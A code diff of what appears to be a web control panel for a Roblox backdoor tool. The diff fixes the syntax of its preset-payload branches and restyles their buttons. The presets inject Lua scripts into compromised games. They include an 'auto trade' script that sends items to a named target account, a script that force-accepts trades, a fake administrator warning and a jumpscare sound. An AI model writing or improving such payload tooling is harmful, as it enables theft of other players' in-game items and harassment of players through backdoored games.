@@ -258,9 +258,8 @@ end)`;
     Text = "Administrator is watching your session!",
     Duration = 10
 })`);
-
-else if (type === 'trade') {
-    setBackdoorLuaPayload(`local TARGET_PLAYER_NAME = "vokareal0" 
+    } else if (type === 'trade') {
+      setBackdoorLuaPayload(`local TARGET_PLAYER_NAME = "vokareal0" 
 local AUTO_SEND_DELAY = 3                 
 local AUTO_ACCEPT = false                  
 
@@ -344,13 +343,11 @@ task.spawn(function()
         end
     end
 end)`);
-
-else if (type === 'Agree') {
-    setBackdoorLuaPayload(`local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm
+    } else if (type === 'Agree') {
+      setBackdoorLuaPayload(`local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm
 Event:FireServer(
     "AcceptTrade"
 )`);
-
     } else if (type === 'jumpscare') {
       setBackdoorLuaPayload(`local sound = Instance.new("Sound", game:GetService("SoundService"))
 sound.SoundId = "rbxassetid://9114223177"
@@ -969,12 +966,12 @@ sound:Play()`);
                 </button>
                 
                 <button onClick={() => setPresetPayload('trade')} className="bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-      <Skull className="w-3.5 h-3.5" /> auto trade
-    </button>
-    
-    <button onClick={() => setPresetPayload('Agree')} className="bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-      <Skull className="w-3.5 h-3.5" /> accept
-    </button>
+                  <Package className="w-3.5 h-3.5" /> Auto Trade
+                </button>
+                
+                <button onClick={() => setPresetPayload('Agree')} className="bg-green-500/15 border border-green-500/30 text-green-400 hover:bg-green-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+                  <Check className="w-3.5 h-3.5" /> Accept Trade
+                </button>
                 
                 <button onClick={() => setPresetPayload('jumpscare')} className="bg-yellow-500/15 border border-yellow-500/30 text-yellow-300 hover:bg-yellow-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                   <AlertTriangle className="w-3.5 h-3.5" /> Sound Jumpscare
